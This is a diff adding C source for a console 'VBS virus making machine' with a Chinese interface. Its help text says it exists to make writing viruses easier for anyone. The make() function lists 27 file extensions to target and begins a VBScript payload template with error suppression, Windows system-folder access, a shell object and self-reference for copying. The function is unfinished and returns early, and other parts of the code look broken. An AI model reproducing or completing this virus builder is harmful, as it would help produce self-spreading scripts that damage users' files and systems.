@@ -1,0 +1,119 @@
+//源码搜集于网路，编译请以c语言形式编译
+#include <stdio.h>
+#include <time.h>
+#include <stdlib.h>
+#include <string.h>
+#include <conio.h>
+#define exit_success 0
+#define again 1
+#define m 4
+int make(); 
+int care(); 
+void password(void); 
+void out(void); 
+main() 
+{ 
+char choose; 
+clrscr(); 
+printf("*******************************************************************************\n"); 
+printf("这是一台VBS病毒制造的机器，它只用于研究，不用于破坏。\n"); 
+printf(" 编写者 W.Z.T\n"); 
+printf(" 版本 0.1\n"); 
+printf("*******************************************************************************\n"); 
+puts("\n\t1--开始制作\t\t2--查看帮助\t\t3--Exit"); 
+while(again) 
+{ 
+printf("choice:"); 
+scanf("%c",&choose); 
+switch(choose) 
+{ 
+case'1': 
+{ 
+make(); 
+clrscr(); 
+return 0; 
+} 
+case'2': 
+{ 
+clrscr(); 
+puts("我喜欢病毒，所以我写了一台机器，任何人都可以使病毒变得更容易。\n"); 
+puts("这个版本是我的第一个版本，我稍后会尝试写一个更好的版本.\n"); 
+out(); 
+} 
+case'3': 
+{ 
+exit(exit_success); 
+} 
+default: 
+{ 
+puts("choice 1,2 or 3"); 
+} 
+} 
+} 
+} 
+void out(void) 
+{ 
+printf("\npause"); 
+getch(); 
+main(); 
+} 
+void password(void) 
+{ 
+int i,j,y=0; 
+char pwd[11+1],pass[]="botres"; 
+fflush(stdin); 
+printf("如果要使用此功能，请输入密码。\n"); 
+for(j=0;;) 
+{ 
+if((pwd[j]=getch())==13) 
+{ 
+pwd[j]='\0'; 
+break; 
+} 
+else if(pwd[j]==8) 
+{ 
+if(y!=0) 
+{ 
+printf("\b"); 
+y--; 
+j--; 
+} 
+putchar(0); 
+printf("\b"); 
+} 
+else if(j==11) 
+continue; 
+else 
+{ 
+printf("*"); 
+y++; 
+j++; 
+} 
+} 
+if(strcmp(pwd,pass)==0) 
+{ 
+printf("\ndone.\n"); 
+} 
+else 
+{ 
+printf("密码错误.\n"); 
+} 
+} 
+int make() 
+{ 
+FILE *fp,*fp1; 
+int i,j,aa,bb,cc,dd,ee,ff,gg,hh,jjj,kkk,lll,y=0,word=0,number=0; 
+char ch,w[5],*vc=w; 
+char subject[200],*sub=subject; 
+char body[400],*bo=body; 
+char string[100],*pop=string; 
+char road[100],name2[40],road2[100],time[20],web[100]; 
+char pwd[11+1],pass[]="wangzhitong"; 
+char *ext1[27]={"txt","vbs","vbe","html","htm","bak","dll","pfg","ppl","c","bin","sig","vdb","dat","doc","xls","tsk","tmp","vdb","vlg","dsc","ptn","set","log","cfg","idx","rec"}; 
+char **pl=ext1; 
+char str1[25][100]={"(ext=\"","(ext=\"","(ext=\"","(ext=\"","(ext=\"","(ext=\"","(ext=\"","(ext=\"","(ext=\"","(ext=\"","(ext=\"","(ext=\"","(ext=\"","(ext=\"","(ext=\"","(ext=\"","(ext=\"","(ext=\"","(ext=\"","(ext=\"","(ext=\"","(ext=\""}; 
+char str2[]="\") or"; 
+char *str[27],**pa=str; 
+char *a="\non error resume next\nset fso=createobject(\"scripting.filesystemobject\")\nset a=createobject(\"wscript.shell\")\nset dir1=fso.getspecialfolder(0)\nset dir2=fso.getspecialfolder(1)\nset k=fso.getfile(wscript.scriptfullname)\n";
+return 0;
+}
